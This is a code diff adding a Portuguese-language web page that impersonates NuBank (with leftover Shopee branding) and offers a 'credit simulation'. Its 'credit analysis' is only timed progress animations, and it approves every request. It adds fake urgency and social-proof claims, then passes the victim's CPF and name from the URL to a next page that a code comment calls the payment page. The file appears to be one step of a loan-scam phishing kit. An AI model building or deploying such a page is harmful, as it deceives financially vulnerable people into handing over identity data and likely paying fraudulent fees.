@@ -1,0 +1,813 @@
+<html lang="pt-BR"><head>
+    <style>
+        .text-white {
+            color: white !important;
+        }
+    </style>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Simulação de Crédito | NuBank</title>
+
+    <script src="/03/js/5oDihyWuKBFn.js"></script>
+
+    <link rel="stylesheet" href="/03/css/8RQDwzfRTl4Q.css">
+
+    <link href="css2-2" rel="stylesheet">
+    
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        shopee: {
+                            light: "#b44aff",
+                            DEFAULT: "#9903d6",
+                            dark: "#7a02ad",
+                        },
+                    },
+                },
+            },
+        };
+    </script>
+
+    <style>
+        body {
+            font-family: "Poppins", sans-serif;
+            background-color: #f6f6f6;
+        }
+
+        /* Gradiente roxo */
+        .shopee-gradient {
+            background: linear-gradient(135deg, #b44aff 0%, #7a02ad 100%);
+        }
+
+        .card {
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
+            border-radius: 16px;
+            transition: all 0.3s ease;
+        }
+
+        .btn-shine {
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-shine:after {
+            content: "";
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(to right,
+                    rgba(255, 255, 255, 0) 0%,
+                    rgba(255, 255, 255, 0.3) 50%,
+                    rgba(255, 255, 255, 0) 100%);
+            transform: rotate(30deg);
+            animation: shine 4s infinite;
+        }
+
+        @keyframes shine {
+            0% {
+                left: -100%;
+                opacity: 0;
+            }
+
+            10% {
+                left: 100%;
+                opacity: 0.6;
+            }
+
+            100% {
+                left: 100%;
+                opacity: 0;
+            }
+        }
+
+        .floating {
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0% {
+                transform: translateY(0px);
+            }
+
+            50% {
+                transform: translateY(-10px);
+            }
+
+            100% {
+                transform: translateY(0px);
+            }
+        }
+
+        /* Ícones circulares */
+        .icon-circle {
+            width: 44px;
+            height: 44px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+        }
+
+        /* Progress bar animation */
+        .progress-bar {
+            height: 6px;
+            background-color: #f0f0f0;
+            border-radius: 10px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .progress-bar-fill {
+            position: absolute;
+            height: 100%;
+            background: linear-gradient(90deg, #b44aff 0%, #9903d6 100%);
+            border-radius: 10px;
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+
+        /* Loading dots animation */
+        .loading-dots span {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background-color: #9903d6;
+            margin: 0 2px;
+            opacity: 0.6;
+        }
+
+        .loading-dots span:nth-child(1) {
+            animation: pulse 1s infinite alternate;
+        }
+
+        .loading-dots span:nth-child(2) {
+            animation: pulse 1s 0.2s infinite alternate;
+        }
+
+        .loading-dots span:nth-child(3) {
+            animation: pulse 1s 0.4s infinite alternate;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+                opacity: 0.6;
+            }
+
+            100% {
+                transform: scale(1.5);
+                opacity: 1;
+            }
+        }
+
+        /* Animação de verificação */
+        .check-circle {
+            width: 20px;
+            height: 20px;
+            background-color: #9903d6;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transform: scale(0);
+            transition: transform 0.3s ease;
+        }
+
+        .check-circle.active {
+            transform: scale(1);
+        }
+
+        /* Transition between steps */
+        .simulation-step {
+            display: none;
+            opacity: 0;
+            transform: translateY(20px);
+            transition: opacity 0.5s ease, transform 0.5s ease;
+        }
+
+        .simulation-step.active {
+            display: block;
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        /* Pulse animation (urgência) em roxo */
+        .pulse {
+            animation: pulse-animation 2s infinite;
+        }
+
+        @keyframes pulse-animation {
+            0% {
+                box-shadow: 0 0 0 0 rgba(153, 3, 214, 0.4);
+            }
+
+            70% {
+                box-shadow: 0 0 0 15px rgba(153, 3, 214, 0);
+            }
+
+            100% {
+                box-shadow: 0 0 0 0 rgba(153, 3, 214, 0);
+            }
+        }
+
+        /* Fade-in animation */
+        .fade-in {
+            animation: fadeIn 0.5s ease-in-out forwards;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Page transition */
+        .page-transition {
+            transition: opacity 0.4s ease-in-out;
+        }
+
+        .fade-out {
+            opacity: 0.5;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="max-w-md mx-auto min-h-screen bg-white">
+        <!-- Header -->
+        <div class="flex flex-wrap items-center justify-between p-4 border-b  shadow-sm sticky top-0 z-10" style="background-color: white;">
+            <div class="flex items-center">
+                <button id="btnVoltar" class="text-shopee text-2xl mr-3">
+                    <i class="fas fa-arrow-left" style="color:9903d6"></i>
+                </button>
+                <div class="flex items-center">
+                    <img src="/03/images/dxXmCeNNzGw9.png" alt="Shopee Logo" class="h-8">
+                    <span class="ml-2 text-xl font-bold text-shopee"></span>
+                </div>
+            </div>
+            <div id="userInfoHeader" class="flex flex-col items-end text-sm">
+                <div class="flex items-center font-medium text-white">
+                    <i class="fas fa-user-circle text-white mr-1" style="color:9903d6"></i>
+                    <span style="color:#fff"></span>
+                </div>
+                <div class="text-xs text-gray-500"></div>
+            </div>
+        </div>
+
+        <!-- Conteúdo da Simulação -->
+        <div class="flex flex-col p-6">
+            <!-- Etapa 1: Input de valor e seleção de prazo -->
+            <div id="step1" class="simulation-step active">
+                <div class="mb-6">
+                    <h1 class="text-2xl font-bold text-gray-800 mb-3">
+                        Solicitar Empréstimo
+                    </h1>
+                    <p class="text-gray-600">
+                        Olá, <span id="userName" class="font-medium">Cliente</span>! Configure
+                        seu empréstimo de acordo com suas necessidades.
+                    </p>
+                </div>
+
+                <div class="relative mb-6">
+                    <h2 class="text-lg font-semibold text-gray-700 mb-4">
+                        Insira o valor do empréstimo desejado
+                    </h2>
+
+                    <div class="border border-gray-300 rounded-xl overflow-hidden flex items-center focus-within:ring-2 focus-within:ring-shopee focus-within:border-transparent">
+                        <div class="pl-4 pr-0 py-5 text-gray-500 text-3xl">R$</div>
+                        <input type="tel" id="creditValue" placeholder="0,00" class="flex-1 border-0 p-5 pl-2 focus:outline-none text-3xl font-bold text-gray-800">
+                    </div>
+                    <p class="text-sm text-gray-500 mt-2">Valor máximo: R$ 10.000,00</p>
+                </div>
+
+                <div class="bg-white rounded-xl shadow-sm p-5 mb-6">
+                    <h2 class="text-lg font-semibold text-gray-700 mb-4">
+                        Selecione a duração do empréstimo
+                    </h2>
+
+                    <div class="grid grid-cols-2 gap-3 mb-3">
+                        <button type="button" class="duration-btn border border-gray-300 rounded-xl py-4 hover:bg-gray-50 text-gray-800" data-months="3">
+                            3 meses
+                        </button>
+                        <button type="button" class="duration-btn border border-gray-300 rounded-xl py-4 hover:bg-gray-50 text-gray-800" data-months="6">
+                            6 meses
+                        </button>
+                    </div>
+
+                    <div class="grid grid-cols-2 gap-3 mb-3">
+                        <button type="button" class="duration-btn border border-gray-300 rounded-xl py-4 hover:bg-gray-50 text-gray-800" data-months="12">
+                            12 meses
+                        </button>
+                        <button type="button" class="duration-btn border border-gray-300 rounded-xl py-4 hover:bg-gray-50 text-gray-800" data-months="24">
+                            24 meses
+                        </button>
+                    </div>
+
+                    <div class="grid grid-cols-2 gap-3">
+                        <button type="button" class="duration-btn border border-gray-300 rounded-xl py-4 hover:bg-gray-50 text-gray-800" data-months="36">
+                            36 meses
+                        </button>
+                        <button type="button" class="duration-btn border border-gray-300 rounded-xl py-4 hover:bg-gray-50 text-gray-800" data-months="48">
+                            48 meses
+                        </button>
+                    </div>
+                </div>
+
+                <div id="resultPreview" class="bg-white rounded-xl shadow-sm p-5 mb-6 hidden">
+                    <h2 class="text-lg font-semibold text-gray-700 mb-3">
+                        Resumo do empréstimo
+                    </h2>
+
+                    <div class="flex justify-between items-center mb-3 pb-3 border-b border-gray-100">
+                        <span class="text-gray-600">Valor solicitado:</span>
+                        <span id="requestedAmount" class="text-gray-800 font-medium">R$ 0,00</span>
+                    </div>
+
+                    <div class="flex justify-between items-center mb-3 pb-3 border-b border-gray-100">
+                        <span class="text-gray-600">Prazo:</span>
+                        <span id="loanDuration" class="text-gray-800 font-medium">0 meses</span>
+                    </div>
+
+                    <div class="flex justify-between items-center mb-3 pb-3 border-b border-gray-100">
+                        <span class="text-gray-600">Taxa de juros:</span>
+                        <span class="text-gray-800 font-medium">0,81% ao mês</span>
+                    </div>
+
+                    <div class="flex justify-between items-center mb-3">
+                        <span class="text-gray-600">Valor da parcela:</span>
+                        <span id="installmentAmount" class="text-gray-800 font-bold">R$ 0,00</span>
+                    </div>
+
+                    <div class="flex justify-between items-center pt-3 border-t border-gray-200">
+                        <span class="text-gray-700 font-medium">Total a pagar:</span>
+                        <span id="totalAmount" class="text-shopee font-bold">R$ 0,00</span>
+                    </div>
+                </div>
+
+                <button id="btnContinue" class="w-full bg-shopee hover:bg-shopee-dark text-white text-lg font-bold py-4 rounded-xl btn-shine" style="margin-bottom:100px">
+                    Continuar
+                </button>
+            </div>
+
+            <!-- Etapa 2: Processando -->
+            <div id="step2" class="simulation-step">
+                <div class="mb-8 text-center">
+                    <h1 class="text-2xl font-bold text-gray-800 mb-3">
+                        Analisando seu crédito
+                    </h1>
+                    <p class="text-gray-600">
+                        Estamos verificando as melhores ofertas para você
+                    </p>
+                </div>
+
+                <div class="flex justify-center mb-10">
+                    <div class="w-24 h-24 rounded-full shopee-gradient flex items-center justify-center">
+                        <div class="w-20 h-20 bg-white rounded-full flex items-center justify-center">
+                            <i class="fas fa-chart-line text-shopee text-3xl"></i>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="space-y-6 mb-8">
+                    <div class="verification-item">
+                        <div class="flex items-center justify-between mb-2">
+                            <p class="text-gray-700">
+                                Verificando seu histórico de crédito...
+                            </p>
+                            <div id="check1" class="check-circle">
+                                <i class="fas fa-check text-white text-xs"></i>
+                            </div>
+                        </div>
+                        <div class="progress-bar">
+                            <div id="progress1" class="progress-bar-fill"></div>
+                        </div>
+                    </div>
+
+                    <div class="verification-item">
+                        <div class="flex items-center justify-between mb-2">
+                            <p class="text-gray-700">Verificando suas compras...</p>
+                            <div id="check2" class="check-circle">
+                                <i class="fas fa-check text-white text-xs"></i>
+                            </div>
+                        </div>
+                        <div class="progress-bar">
+                            <div id="progress2" class="progress-bar-fill"></div>
+                        </div>
+                    </div>
+
+                    <div class="verification-item">
+                        <div class="flex items-center justify-between mb-2">
+                            <p class="text-gray-700">
+                                Verificando comportamento na plataforma...
+                            </p>
+                            <div id="check3" class="check-circle">
+                                <i class="fas fa-check text-white text-xs"></i>
+                            </div>
+                        </div>
+                        <div class="progress-bar">
+                            <div id="progress3" class="progress-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="text-center mt-8">
+                    <div class="loading-dots">
+                        <span></span>
+                        <span></span>
+                        <span></span>
+                    </div>
+                    <p class="text-sm text-gray-500 mt-2">
+                        Por favor, aguarde enquanto finalizamos a análise...
+                    </p>
+                </div>
+            </div>
+
+            <!-- Etapa 3: Resultado Final -->
+            <div id="step3" class="simulation-step">
+                <div class="mb-6">
+                    <h1 class="text-2xl font-bold text-gray-800 mb-3">
+                        Empréstimo Aprovado!
+                    </h1>
+                    <p class="text-gray-600">
+                        Parabéns, <span id="userName2" class="font-medium">Cliente</span>!
+                        Seu empréstimo foi aprovado.
+                    </p>
+                </div>
+
+                <div class="mb-6">
+                    <div class="bg-white rounded-xl shadow-sm p-5 mb-5">
+                        <div class="flex flex-col items-center justify-center py-4">
+                            <div class="text-4xl font-bold text-shopee mb-2" id="approvedValue">
+                                R$ 0,00
+                            </div>
+                            <p class="text-gray-600">Valor aprovado para você!</p>
+                        </div>
+                    </div>
+
+                    <!-- Resumo do empréstimo aprovado - Ajustes para mostrar valor aprovado -->
+                    <div class="bg-white rounded-xl shadow-sm p-5 mb-6">
+                        <h2 class="text-lg font-semibold text-gray-700 mb-3">
+                            Resumo do seu empréstimo
+                        </h2>
+
+                        <div class="flex justify-between items-center mb-3 pb-3 border-b border-gray-100">
+                            <span class="text-gray-600">Valor aprovado:</span>
+                            <span id="finalApprovedAmount" class="text-gray-800 font-medium">R$ 0,00</span>
+                        </div>
+
+                        <div class="flex justify-between items-center mb-3 pb-3 border-b border-gray-100">
+                            <span class="text-gray-600">Prazo:</span>
+                            <span id="finalLoanDuration" class="text-gray-800 font-medium">0 meses</span>
+                        </div>
+
+                        <div class="flex justify-between items-center mb-3 pb-3 border-b border-gray-100">
+                            <span class="text-gray-600">Taxa de juros:</span>
+                            <span class="text-gray-800 font-medium">0,81% ao mês</span>
+                        </div>
+
+                        <div class="flex justify-between items-center mb-3">
+                            <span class="text-gray-600">Valor da parcela:</span>
+                            <span id="finalInstallmentAmount" class="text-gray-800 font-bold">R$ 0,00</span>
+                        </div>
+
+                        <div class="flex justify-between items-center pt-3 border-t border-gray-200">
+                            <span class="text-gray-700 font-medium">Total a pagar:</span>
+                            <span id="finalTotalAmount" class="text-shopee font-bold">R$ 0,00</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-white rounded-xl shadow-sm p-5 mb-6">
+                    <div class="flex items-center mb-4">
+                        <div class="bg-green-100 icon-circle mr-3 flex-shrink-0">
+                            <i class="fas fa-clock text-green-600"></i>
+                        </div>
+                        <div>
+                            <h3 class="font-medium text-gray-800">
+                                Oferta válida apenas hoje!
+                            </h3>
+                            <p class="text-sm text-gray-600">
+                                Não perca esta oportunidade única.
+                            </p>
+                        </div>
+                    </div>
+
+                    <div class="text-center text-sm text-gray-500 mb-3">
+                        <span class="text-green-600 font-medium">✓</span> Mais de 2.400
+                        pessoas já ativaram hoje
+                    </div>
+                </div>
+
+                <button id="btnRequest" class="w-full bg-shopee hover:bg-shopee-dark text-white text-lg font-bold py-4 rounded-xl btn-shine pulse" style="margin-bottom:100px">
+                    PROSSEGUIR COM A SOLICITAÇÃO
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            // Elementos das etapas
+            const step1 = document.getElementById("step1");
+            const step2 = document.getElementById("step2");
+            const step3 = document.getElementById("step3");
+
+            // Botões
+            const btnContinue = document.getElementById("btnContinue");
+            const btnRequest = document.getElementById("btnRequest");
+
+            // Elementos de formulário
+            const creditValue = document.getElementById("creditValue");
+            const approvedValue = document.getElementById("approvedValue");
+
+            // Definir nome do usuário (pode ser dinâmico com parâmetros URL)
+            const urlParams = new URLSearchParams(window.location.search);
+            const name = urlParams.get("nome") || "Cliente";
+            document.getElementById("userName").textContent = name;
+
+            // Salvar o nome do usuário no localStorage se estiver disponível na URL
+            if (urlParams.get("nome")) {
+                localStorage.setItem("nomeUsuario", urlParams.get("nome"));
+                console.log("Nome salvo no localStorage:", urlParams.get("nome"));
+            }
+
+            // Formatar valor de crédito enquanto digita e limitar a 10.000
+            creditValue.addEventListener("input", function (e) {
+                let value = e.target.value.replace(/\D/g, "");
+
+                if (value === "") {
+                    e.target.value = "";
+                    return;
+                }
+
+                // Converter para float e formatar
+                let floatValue = parseFloat(value) / 100;
+
+                // Limitar a 10.000
+                if (floatValue > 10000) {
+                    floatValue = 10000;
+                    value = "1000000";
+                }
+
+                e.target.value = floatValue
+                    .toLocaleString("pt-BR", {
+                        minimumFractionDigits: 2,
+                        maximumFractionDigits: 2,
+                    });
+
+                // Atualizar preview se um prazo já tiver sido selecionado
+                if (selectedDuration) {
+                    updateLoanCalculation(floatValue, selectedDuration);
+                }
+            });
+
+            // Variável para armazenar a duração selecionada
+            let selectedDuration = null;
+
+            // Adicionar evento de clique aos botões de duração
+            const durationButtons = document.querySelectorAll(".duration-btn");
+            durationButtons.forEach((button) => {
+                button.addEventListener("click", function () {
+                    // Remover classe selecionada de todos os botões
+                    durationButtons.forEach((btn) => {
+                        btn.classList.remove(
+                            "bg-shopee-light",
+                            "bg-opacity-20",
+                            "border-shopee",
+                            "text-shopee"
+                        );
+                        btn.classList.add("border-gray-300", "text-gray-800");
+                    });
+
+                    // Adicionar classe selecionada ao botão clicado
+                    this.classList.remove("border-gray-300", "text-gray-800");
+                    this.classList.add(
+                        "bg-shopee-light",
+                        "bg-opacity-20",
+                        "border-shopee",
+                        "text-shopee"
+                    );
+
+                    // Armazenar duração selecionada
+                    selectedDuration = parseInt(this.getAttribute("data-months"));
+
+                    // Atualizar cálculo do empréstimo
+                    const loanAmount =
+                        parseFloat(creditValue.value.replace(/\D/g, "")) / 100;
+                    updateLoanCalculation(loanAmount, selectedDuration);
+                });
+            });
+
+            // Função para calcular e atualizar o resumo do empréstimo
+            function updateLoanCalculation(amount, months) {
+                if (isNaN(amount) || amount <= 0 || !months) return;
+
+                // Mostrar o preview
+                const resultPreview = document.getElementById("resultPreview");
+                resultPreview.classList.remove("hidden");
+
+                // Atualizar valores solicitados
+                document.getElementById("requestedAmount").textContent =
+                    formatCurrency(amount);
+                document.getElementById(
+                    "loanDuration"
+                ).textContent = `${months} meses`;
+
+                // Calcular valor com juros (0.81% ao mês)
+                const monthlyRate = 0.0081; // 0.81% ao mês
+
+                // Cálculo do valor da parcela usando a fórmula de amortização
+                const installmentValue =
+                    (amount * (monthlyRate * Math.pow(1 + monthlyRate, months))) /
+                    (Math.pow(1 + monthlyRate, months) - 1);
+                const totalAmount = installmentValue * months;
+
+                // Atualizar valores calculados
+                document.getElementById("installmentAmount").textContent =
+                    formatCurrency(installmentValue);
+                document.getElementById("totalAmount").textContent =
+                    formatCurrency(totalAmount);
+            }
+
+            // Função auxiliar para formatar valores monetários
+            function formatCurrency(value) {
+                return (
+                    "R$ " +
+                    value
+                        .toLocaleString("pt-BR", {
+                            minimumFractionDigits: 2,
+                            maximumFractionDigits: 2,
+                        })
+                );
+            }
+
+            // Simulação - Etapa 1 para Etapa 2
+            btnContinue.addEventListener("click", function () {
+                if (!creditValue.value) {
+                    alert("Por favor, digite um valor para simular.");
+                    return;
+                }
+
+                if (!selectedDuration) {
+                    alert("Por favor, selecione uma duração para o empréstimo.");
+                    return;
+                }
+
+                // Obter o valor digitado
+                const loanAmount =
+                    parseFloat(creditValue.value.replace(/\D/g, "")) / 100;
+
+                // Valor aprovado é o valor solicitado menos R$ 22,00
+                const approvedValue = Math.max(loanAmount - 22, 0);
+
+                // Calcular valor com juros (0.81% ao mês) baseado no valor APROVADO
+                const monthlyRate = 0.0081; // 0.81% ao mês
+                const installmentValue =
+                    (approvedValue *
+                        (monthlyRate * Math.pow(1 + monthlyRate, selectedDuration))) /
+                    (Math.pow(1 + monthlyRate, selectedDuration) - 1);
+                const totalAmount = installmentValue * selectedDuration;
+
+                // Formatar valor aprovado
+                const formattedValue = approvedValue.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+
+                // Atualizar o valor aprovado exibido
+                document.getElementById("approvedValue").textContent =
+                    "R$ " + formattedValue;
+
+                // Salvar valor aprovado e detalhes do empréstimo no localStorage
+                localStorage.setItem("creditoAprovado", formattedValue);
+                localStorage.setItem("creditoAprovadoValor", approvedValue);
+                localStorage.setItem("creditoDuracao", selectedDuration);
+                localStorage.setItem("creditoParcela", installmentValue.toFixed(2));
+                localStorage.setItem("creditoTotal", totalAmount.toFixed(2));
+                localStorage.setItem("creditoSolicitado", loanAmount.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 }));
+
+                // Preencher os valores no resumo da etapa final
+                document.getElementById("finalApprovedAmount").textContent =
+                    formatCurrency(approvedValue);
+                document.getElementById(
+                    "finalLoanDuration"
+                ).textContent = `${selectedDuration} meses`;
+                document.getElementById("finalInstallmentAmount").textContent =
+                    formatCurrency(installmentValue);
+                document.getElementById("finalTotalAmount").textContent =
+                    formatCurrency(totalAmount);
+                document.getElementById("userName2").textContent = name;
+
+                // Mudar para etapa 2 (processando)
+                step1.classList.remove("active");
+                step2.classList.add("active");
+
+                // Iniciar simulação de progresso
+                runVerificationProcess();
+            });
+
+            // Simulação - Etapa 3 para redirecionamento
+            btnRequest.addEventListener("click", function () {
+                // Obter o CPF e nome diretamente dos parâmetros da URL atual
+                const urlParams = new URLSearchParams(window.location.search);
+                const cpf = urlParams.get("cpf") || "";
+                const nomeUsuario = urlParams.get("nome") || "";
+
+                // Obter o valor aprovado do localStorage
+                const valorAprovado =
+                    localStorage.getItem("creditoAprovadoValor") || "";
+
+                // Criar um novo objeto URLSearchParams para a nova URL
+                const novaUrl = new URLSearchParams();
+
+                // Adicionar todos os parâmetros atuais à nova URL
+                for (const [chave, valor] of urlParams.entries()) {
+                    novaUrl.append(chave, valor);
+                }
+
+                // Adicionar ou atualizar parâmetros específicos
+                novaUrl.set("cpf", cpf);
+
+                // Adicionar o nome se disponível
+                if (nomeUsuario) {
+                    novaUrl.set("nome", nomeUsuario);
+                }
+
+                // Redirecionar para a página de pagamento com todos os parâmetros
+                window.location.href = '../04' + window.location.search;
+            });
+
+            // Função para simular o processo de verificação
+            function runVerificationProcess() {
+                const progress1 = document.getElementById("progress1");
+                const progress2 = document.getElementById("progress2");
+                const progress3 = document.getElementById("progress3");
+                const check1 = document.getElementById("check1");
+                const check2 = document.getElementById("check2");
+                const check3 = document.getElementById("check3");
+
+                // Progresso 1
+                setTimeout(() => {
+                    animateProgress(progress1, 100, 1500, () => {
+                        check1.classList.add("active");
+                    });
+                }, 500);
+
+                // Progresso 2
+                setTimeout(() => {
+                    animateProgress(progress2, 100, 1800, () => {
+                        check2.classList.add("active");
+                    });
+                }, 2000);
+
+                // Progresso 3
+                setTimeout(() => {
+                    animateProgress(progress3, 100, 2000, () => {
+                        check3.classList.add("active");
+
+                        // Após todas as verificações, esperar um pouco e ir para o resultado
+                        setTimeout(() => {
+                            step2.classList.remove("active");
+                            step3.classList.add("active");
+                        }, 1000);
+                    });
+                }, 4000);
+            }
+
+            // Função para animar a barra de progresso
+            function animateProgress(element, target, duration, callback) {
+                let start = 0;
+                const step = (timestamp) => {
+                    if (!start) start = timestamp;
+                    const progress = Math.min((timestamp - start) / duration, 1);
+                    const value = progress * target;
+
+                    element.style.width = value + "%";
+
+                    if (progress < 1) {
+                        window.requestAnimationFrame(step);
+                    } else if (callback) {
+                        callback();
+                    }
+                };
+
+                window.requestAnimationFrame(step);
+            }
+        });
+    </script>
+    <script defer="" src="vcd15cbe7772f49c399c6a5babf22c1241717689176015-2" data-cf-beacon="{" version":"2024.11.0","token":"86597e4d33a3484287d765df7c191f9f","r":1,"server_timing":{"name":{"cfcachestatus":true,"cfedge":true,"cfextpri":true,"cfl4":true,"cforigin":true,"cfspeedbrain":true},"location_startswith":null}}"="" crossorigin="anonymous"></script>
+
+
+
+
+</body></html>
